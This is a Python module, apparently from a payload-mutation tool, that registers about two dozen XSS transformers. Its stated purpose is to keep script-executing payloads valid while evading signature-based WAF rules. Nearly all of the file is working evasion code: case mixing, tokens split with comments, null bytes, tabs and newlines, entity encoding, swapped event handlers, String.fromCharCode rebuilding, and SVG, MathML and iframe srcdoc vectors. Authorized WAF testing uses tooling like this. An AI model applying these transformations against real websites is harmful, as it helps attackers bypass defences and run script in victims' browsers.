"""XSS context-aware tricks — HTML/JS parser quirks that keep a script-executing
payload valid while breaking signature-style WAF rules (tag/attr case, token
splitting, alternate vectors, entity tricks, JS string rebuilding).
"""
from __future__ import annotations

import re

from .base import REGISTRY

_XSS = {"XSS Injection"}

_EVENT_MAP = {
    "onerror": "onpointerover",
    "onload": "onfocus",
}


def tag_case_mix(s: str) -> str:
    """Mixed-case tag names: <script> -> <ScRiPt>."""
    def mix(m: re.Match) -> str:
        tag = m.group(1)
        return "<" + "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(tag))
    return re.sub(r"<([a-zA-Z]+)", mix, s)


def attr_case_mix(s: str) -> str:
    """Mixed-case event-handler attribute names: onerror -> OnErRoR."""
    def mix(m: re.Match) -> str:
        attr = m.group(0)
        return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(attr))
    return re.sub(r"on[a-zA-Z]+", mix, s)


def split_tag_with_comment(s: str) -> str:
    """Insert an HTML comment inside the 'script' token: scr<!---->ipt."""
    return re.sub(r"script", "scr<!---->ipt", s, flags=re.IGNORECASE)


def split_tag_with_null(s: str) -> str:
    """Insert a literal null byte inside 'script'/'alert' tokens."""
    return (re.sub(r"script", "scr\x00ipt", s, flags=re.IGNORECASE)
             .replace("alert", "aler\x00t"))


def split_keyword_newline(s: str) -> str:
    """Insert a newline inside the 'javascript:' scheme token."""
    return re.sub(r"javascript:", "java\nscript:", s, flags=re.IGNORECASE)


def alt_event_handler(s: str) -> str:
    """Swap common event handlers for less-filtered equivalents."""
    out = s
    for old, new in _EVENT_MAP.items():
        out = re.sub(old, new, out, flags=re.IGNORECASE)
    return out


def event_handler_focus_autofocus(s: str) -> str:
    """onerror -> onfocus + autofocus attribute pairing (img/input vector)."""
    return re.sub(r"onerror\s*=", "autofocus onfocus=", s, flags=re.IGNORECASE)


def javascript_scheme_tab(s: str) -> str:
    """'javascript:' -> 'java\\tscript:' (tab-split scheme, HTML5 strips it)."""
    return re.sub(r"javascript:", "java\tscript:", s, flags=re.IGNORECASE)


def javascript_scheme_entity(s: str) -> str:
    """'javascript:' -> entity-encode the 'a': j&#x61;vascript:."""
    return re.sub(r"javascript:", "j&#x61;vascript:", s, flags=re.IGNORECASE)


def javascript_scheme_newline(s: str) -> str:
    """'javascript:' -> newline inserted mid-token (HTML attr parser strips newlines)."""
    return re.sub(r"javascript:", "jav\nascript:", s, flags=re.IGNORECASE)


def backtick_template_literal(s: str) -> str:
    """alert(1) -> alert`1` using tagged-template call syntax (no parens)."""
    return re.sub(r"alert\((\w*)\)", r"alert`\1`", s)


def html5_entity_named(s: str) -> str:
    """Replace '<' and '>' with named HTML entities &lt; / &gt;."""
    return s.replace("<", "&lt;").replace(">", "&gt;")


def decimal_entity_angle(s: str) -> str:
    """Replace '<' and '>' with decimal numeric entities."""
    return s.replace("<", "&#60;").replace(">", "&#62;")


def hex_entity_angle_padded(s: str) -> str:
    """Replace '<' with zero-padded hex entity &#x03c; (extra leading zero)."""
    return s.replace("<", "&#x03c;").replace(">", "&#x03e;")


def data_uri_svg(s: str) -> str:
    """Wrap an inline script body inside a data: URI SVG vector."""
    inner = re.sub(r"</?script[^>]*>", "", s, flags=re.IGNORECASE).strip()
    if not inner:
        inner = "alert(1)"
    return f'<svg><script>{inner}</script></svg>'.replace(
        "<svg>", 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg">'
    )


def svg_onload_vector(s: str) -> str:
    """Rebuild the payload body as an SVG onload vector."""
    body = re.sub(r"<[^>]+>", "", s).strip() or "alert(1)"
    return f'<svg onload="{body}">'


def math_vector(s: str) -> str:
    """Rebuild as a MathML <math> href javascript: vector."""
    body = re.sub(r"<[^>]+>", "", s).strip() or "alert(1)"
    return f'<math href="javascript:{body}">CLICK</math>'


def whitespace_slash_in_tag(s: str) -> str:
    """Insert a stray '/' before the first tag's closing '>' (parser-tolerant)."""
    return re.sub(r"(<[a-zA-Z]+)(>)", r"\1/\2", s, count=1)


def whitespace_tab_in_tag(s: str) -> str:
    """Insert a horizontal tab (\\x09) right after the opening tag name."""
    return re.sub(r"(<[a-zA-Z]+)(\s|>)", lambda m: m.group(1) + "\x09" + m.group(2), s, count=1)


def whitespace_newline_in_tag(s: str) -> str:
    """Insert a newline (\\x0a) right after the opening tag name."""
    return re.sub(r"(<[a-zA-Z]+)(\s|>)", lambda m: m.group(1) + "\x0a" + m.group(2), s, count=1)


def whitespace_formfeed_in_tag(s: str) -> str:
    """Insert a form feed (\\x0c) right after the opening tag name."""
    return re.sub(r"(<[a-zA-Z]+)(\s|>)", lambda m: m.group(1) + "\x0c" + m.group(2), s, count=1)


def fromcharcode_rebuild(s: str) -> str:
    """Rebuild a quoted JS string argument via String.fromCharCode(...)."""
    m = re.search(r"alert\(([\'\"])(.*?)\1\)", s)
    if m:
        literal = m.group(2)
        codes = ",".join(str(ord(c)) for c in literal) or "49"
        return s[:m.start()] + f"alert(String.fromCharCode({codes}))" + s[m.end():]
    # fallback: numeric-arg alert(1) -> alert(String.fromCharCode(49))
    m2 = re.search(r"alert\((\d+)\)", s)
    if m2:
        codes = ",".join(str(ord(c)) for c in m2.group(1))
        return s[:m2.start()] + f"alert(String.fromCharCode({codes}))" + s[m2.end():]
    return s


def script_src_srcdoc(s: str) -> str:
    """Rebuild as an <iframe srcdoc> vector carrying the script body."""
    body = re.sub(r"<[^>]+>", "", s).strip() or "alert(1)"
    return f"<iframe srcdoc=\"<script>{body}</script>\">"


def _register() -> None:
    R = REGISTRY
    R.add("xss_tag_case_mix", tag_case_mix, "obfuscator",
          "mixed-case tag names (<ScRiPt>)", classes=_XSS)
    R.add("xss_attr_case_mix", attr_case_mix, "obfuscator",
          "mixed-case event-handler attributes", classes=_XSS)
    R.add("xss_split_tag_comment", split_tag_with_comment, "obfuscator",
          "HTML comment inside 'script' token", classes=_XSS)
    R.add("xss_split_tag_null", split_tag_with_null, "obfuscator",
          "null byte inside 'script'/'alert' tokens", classes=_XSS)
    R.add("xss_split_js_scheme_newline", split_keyword_newline, "obfuscator",
          "newline inside 'javascript:' token", classes=_XSS)
    R.add("xss_alt_event_handler", alt_event_handler, "obfuscator",
          "swap onerror/onload for less-filtered handlers", classes=_XSS)
    R.add("xss_event_focus_autofocus", event_handler_focus_autofocus, "obfuscator",
          "onerror= -> autofocus onfocus= pairing", classes=_XSS)
    R.add("xss_js_scheme_tab", javascript_scheme_tab, "obfuscator",
          "'javascript:' split with tab", classes=_XSS)
    R.add("xss_js_scheme_entity", javascript_scheme_entity, "encoder",
          "'javascript:' with entity-encoded 'a'", classes=_XSS)
    R.add("xss_js_scheme_newline", javascript_scheme_newline, "obfuscator",
          "'javascript:' split with embedded newline", classes=_XSS)
    R.add("xss_backtick_template", backtick_template_literal, "obfuscator",
          "alert(1) -> alert`1` tagged template call", classes=_XSS)
    R.add("xss_entity_named_angle", html5_entity_named, "encoder",
          "'<'/'>' -> &lt;/&gt;", classes=_XSS)
    R.add("xss_entity_decimal_angle", decimal_entity_angle, "encoder",
          "'<'/'>' -> decimal numeric entities", classes=_XSS)
    R.add("xss_entity_hex_padded_angle", hex_entity_angle_padded, "encoder",
          "'<'/'>' -> zero-padded hex entities", classes=_XSS)
    R.add("xss_data_uri_svg", data_uri_svg, "obfuscator",
          "rebuild as data: URI SVG vector", classes=_XSS)
    R.add("xss_svg_onload", svg_onload_vector, "obfuscator",
          "rebuild as <svg onload=...> vector", classes=_XSS)
    R.add("xss_math_vector", math_vector, "obfuscator",
          "rebuild as MathML javascript: href vector", classes=_XSS)
    R.add("xss_whitespace_slash_tag", whitespace_slash_in_tag, "obfuscator",
          "stray '/' before first tag's closing '>'", classes=_XSS)
    R.add("xss_whitespace_tab_tag", whitespace_tab_in_tag, "obfuscator",
          "\\x09 right after opening tag name", classes=_XSS)
    R.add("xss_whitespace_newline_tag", whitespace_newline_in_tag, "obfuscator",
          "\\x0a right after opening tag name", classes=_XSS)
    R.add("xss_whitespace_formfeed_tag", whitespace_formfeed_in_tag, "obfuscator",
          "\\x0c right after opening tag name", classes=_XSS)
    R.add("xss_fromcharcode_rebuild", fromcharcode_rebuild, "obfuscator",
          "alert('x') -> alert(String.fromCharCode(...))", classes=_XSS)
    R.add("xss_iframe_srcdoc", script_src_srcdoc, "obfuscator",
          "rebuild as <iframe srcdoc> vector", classes=_XSS)


_register()
